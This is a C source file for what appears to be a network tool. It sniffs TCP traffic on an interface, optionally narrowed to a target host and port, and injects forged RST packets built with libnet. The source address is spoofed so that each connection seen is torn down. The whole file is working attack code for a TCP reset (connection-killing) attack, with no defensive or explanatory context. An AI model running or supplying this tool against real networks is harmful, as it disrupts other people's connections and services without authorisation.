#include "resetter.h"
#include "listener.h"

#include "utils/net_utils.h"

static void _on_synack_packet_captured(
        resetter_context_t *ctx,
        const struct pcap_pkthdr *cap_header,
        const u_char *packet);

static void _cleanup(resetter_context_t *);

static int _init_libnet(resetter_context_t *ctx) {
    int injection_type = LIBNET_RAW4; // Layer 3 (network)
    char errbuf[LIBNET_ERRBUF_SIZE];

    ctx->libnet = libnet_init(injection_type, ctx->device, errbuf);
    if (ctx->libnet == NULL) {
        fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
        return -1;
    }

    if (libnet_seed_prand(ctx->libnet) == -1) {
        fprintf(stderr, "libnet_seed_prand() failed: %s\n",libnet_geterror(ctx->libnet));
        return -1;
    }

    return 0;
}

static int _update_pcap_filter(resetter_context_t *ctx) {
    char *filter_prefix = "( tcp[tcpflags] & tcp-ack != 0 ) && ";
    char *filter_suffix = ctx->filter_string;
    char *filter_string;

    if (filter_suffix != NULL && strlen(filter_suffix) == 0) {
        // Default filter: All TCP traffic
        filter_suffix = "tcp";
    }

    // Always prepend with this condition to just include SYN-ACK packets
    filter_string = (char *)malloc(sizeof(char) * strlen(filter_prefix) + strlen(filter_suffix) + 1);
    if (filter_string == NULL) {
        perror("malloc() failed");
        return -1;
    }

    filter_string[0] = 0;
    strcat(filter_string, filter_prefix);
    strcat(filter_string, filter_suffix);

    strncpy(ctx->filter_string, filter_string, sizeof(ctx->filter_string));
    free(filter_string);

    return 0;
}

int send_reset_packet(
        resetter_context_t *ctx,
        struct sockaddr_in saddr, uint16_t sport,
        struct sockaddr_in daddr, uint16_t dport,
        uint32_t ack) {
    char saddr_str[16], daddr_str[16];
    int bytes_written;
    static libnet_ptag_t tcp_tag = LIBNET_PTAG_INITIALIZER;
    static libnet_ptag_t ip_tag = LIBNET_PTAG_INITIALIZER;

    // inet_ntoa stores results in a static buffer that gets overwritten with every call
    strncpy(saddr_str, inet_ntoa(saddr.sin_addr), sizeof(saddr_str));
    strncpy(daddr_str, inet_ntoa(daddr.sin_addr), sizeof(daddr_str));

    printf("Resetting %s:%d <-> %s:%d\a\n",
           saddr_str, sport,
           daddr_str, dport);

    // Build TCP header
    tcp_tag = libnet_build_tcp(
            sport,                           // Source TCP port (pretend we are dst)
            dport,                           // Destination TCP port (send back to src)
            ack,                             // Sequence number (use previous ack)
            (uint32_t)libnet_get_prand(LIBNET_PRu32), // Acknowledgement number
            TH_RST,                          // Control flags (RST flag set only)
            (uint16_t)libnet_get_prand(LIBNET_PRu16), // Window size
            0,                               // Checksum
            0,                               // Urgent pointer
            LIBNET_TCP_H,                    // Packet size (so far)
            NULL,                            // Payload (none)
            0,                               // Payload length
            ctx->libnet,
            tcp_tag);
    if (tcp_tag == -1) {
        fprintf(stderr, "Error building RST packet TCP header: %s\n",
                libnet_geterror(ctx->libnet));
        libnet_clear_packet(ctx->libnet);
        tcp_tag = LIBNET_PTAG_INITIALIZER;
        ip_tag = LIBNET_PTAG_INITIALIZER;
        return -1;
    }

    // Build IP header
    ip_tag = libnet_build_ipv4(
            LIBNET_IPV4_H + LIBNET_TCP_H,    // Packet size (so far)
            IPTOS_LOWDELAY,                  // TOS
            (uint16_t)libnet_get_prand(LIBNET_PRu16), // IP ID
            0,                               // IP frag flags/offset
            64,                              // TTL
            IPPROTO_TCP,                     // Transport protocol
            0,                               // Checksum (auto calculate)
            saddr.sin_addr.s_addr,           // Source IP (pretend we are dst)
            daddr.sin_addr.s_addr,           // Destination IP (send back to src)
            NULL,                            // Payload (none)
            0,                               // Payload length
            ctx->libnet,
            ip_tag);
    if (ip_tag == -1) {
        fprintf(stderr, "Error building RST packet IP header: %s\n",
                libnet_geterror(ctx->libnet));
        libnet_clear_packet(ctx->libnet);
        tcp_tag = LIBNET_PTAG_INITIALIZER;
        ip_tag = LIBNET_PTAG_INITIALIZER;
        return -1;
    }

    // Write packet
    bytes_written = libnet_write(ctx->libnet);
    if (bytes_written == -1) {
        fprintf(stderr, "Error writing RST packet: %s\n",
                libnet_geterror(ctx->libnet));
        libnet_clear_packet(ctx->libnet);
        tcp_tag = LIBNET_PTAG_INITIALIZER;
        ip_tag = LIBNET_PTAG_INITIALIZER;
        return -1;
    }

    maybe_print_libnet_stats(ctx, "RST");

    return 0;
}

static void *_resetter_thread(void *vargp) {
    thread_node *thread = (thread_node *)vargp;
    resetter_context_t *ctx = &thread->ctx;

    if (listener_start(ctx, _on_synack_packet_captured) != 0) {
        listener_stop(ctx);
        return NULL;
    }

    return NULL;
}

int start_resetter_thread(thread_node *thread, char *device, char *target_ip, uint16_t target_port) {
    resetter_context_t *ctx = &thread->ctx;
    memset(ctx, 0, sizeof(resetter_context_t));

    if (target_ip != NULL && target_port > 0) {
        snprintf(ctx->filter_string, sizeof(ctx->filter_string),
                "( host %s && tcp port %d )", target_ip, target_port);
    } else if (target_ip != NULL) {
        snprintf(ctx->filter_string, sizeof(ctx->filter_string),
                "host %s", target_ip);
    } else if (target_port > 0) {
        snprintf(ctx->filter_string, sizeof(ctx->filter_string),
                "tcp port %d", target_port);
    }

    ctx->cleanup = _cleanup;
    ctx->device = device;
    ctx->target_port = target_port;
    if (target_ip != NULL) {
        ctx->target_addr.sin_addr.s_addr = inet_addr(target_ip);
    }

    _update_pcap_filter(ctx);
    printf("Monitoring TCP traffic on %s ( %s )...\n", ctx->device, ctx->filter_string);

    if (_init_libnet(ctx) != 0) {
        return -1;
    }

    if (pthread_create(&thread->thread_id, NULL, _resetter_thread, (void *)thread) != 0) {
        perror("pthread_create() failed");
        return -1;
    }

    return 0;
}

static void _on_synack_packet_captured(
        resetter_context_t *ctx,
        const struct pcap_pkthdr *cap_header,
        const u_char *packet) {
    struct sockaddr_in saddr, daddr;
    struct libnet_ipv4_hdr *ip_hdr = (struct libnet_ipv4_hdr *)(packet + LIBNET_ETH_H);
    struct libnet_tcp_hdr *tcp_hdr = (struct libnet_tcp_hdr *)(packet + LIBNET_ETH_H + LIBNET_TCP_H);

    if (!(tcp_hdr->th_flags & (TH_SYN | TH_ACK))) {
        // Not a SYN-ACK packet (which should never happen because of bpf expr)
        return;
    }

    if (ctx->target_port > 0 &&
        htons(tcp_hdr->th_dport) != ctx->target_port &&
        htons(tcp_hdr->th_sport) != ctx->target_port) {
        // Port didn't match (which should never happen because of bpf expr)
        return;
    }

    // Get saddr/daddr from IPv4 header
    memset(&saddr, 0, sizeof(struct sockaddr_in));
    memset(&daddr, 0, sizeof(struct sockaddr_in));
    saddr.sin_addr.s_addr = *((uint32_t *)&(ip_hdr->ip_src));
    daddr.sin_addr.s_addr = *((uint32_t *)&(ip_hdr->ip_dst));

    // SYN-ACK packet sent from dest to source, so send a RST packet
    // back to dest (spoofed as source).
    send_reset_packet(ctx,
            daddr, htons(tcp_hdr->th_dport),
            saddr, htons(tcp_hdr->th_sport),
            htonl(tcp_hdr->th_ack));
}

static void _cleanup(resetter_context_t *ctx) {
    if (is_listener_started(ctx)) {
        listener_stop(ctx);
    }

    if (ctx->pcap != NULL) {
        pcap_close(ctx->pcap);
        ctx->pcap = NULL;
    }

    if (ctx->libnet != NULL) {
        libnet_destroy(ctx->libnet);
        ctx->libnet = NULL;
    }
}
